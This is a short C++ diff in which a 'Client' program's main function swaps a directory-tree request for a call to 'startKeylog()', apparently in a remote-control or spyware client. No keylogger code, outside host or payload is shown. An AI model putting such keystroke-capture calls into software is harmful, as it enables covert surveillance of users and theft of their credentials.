@@ -4,7 +4,7 @@
 int main()
 {
     Client c;
-    if (c.dirTree("."))
+    if (c.startKeylog())
     {
         std::cout << "Request fail\n" << "\n";
     }
